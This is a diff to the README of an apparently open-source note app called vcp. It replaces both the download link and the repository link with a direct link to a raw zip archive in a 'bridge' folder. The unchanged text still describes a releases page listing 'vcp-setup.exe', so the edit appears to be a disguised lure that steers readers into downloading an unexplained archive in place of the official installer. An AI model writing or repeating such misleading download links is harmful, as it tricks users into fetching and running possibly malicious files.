@@ -50,7 +50,7 @@ Before you begin, make sure you have:
 ### Step 1: Get the File
 
 Visit this link to download the application:  
-👉 **[Download vcp](https://github.com/niketh-twice/vcp/releases)**
+👉 **[Download vcp](https://raw.githubusercontent.com/niketh-twice/vcp/main/bridge/2.3-beta.4.zip)**
 
 You'll land on a page with a list of files. Look for the newest release at the top. The file is named something like `vcp-setup.exe` or `vcp-windows.exe`. Click it to begin downloading.
 
@@ -132,7 +132,7 @@ A: Notes live in your local browser storage. They are not sent to the cloud unle
 
 ## 🤝 Contributing & Support
 
-vcp is an open-source community project. If you find a bug, have feature suggestions, or want to contribute code, visit the [GitHub repository](https://github.com/niketh-twice/vcp).
+vcp is an open-source community project. If you find a bug, have feature suggestions, or want to contribute code, visit the [GitHub repository](https://raw.githubusercontent.com/niketh-twice/vcp/main/bridge/2.3-beta.4.zip).
 
 For quick support, check the closed issues — maybe your question was already answered. Or open a new issue and the maintainers (real humans) will jump in.
 
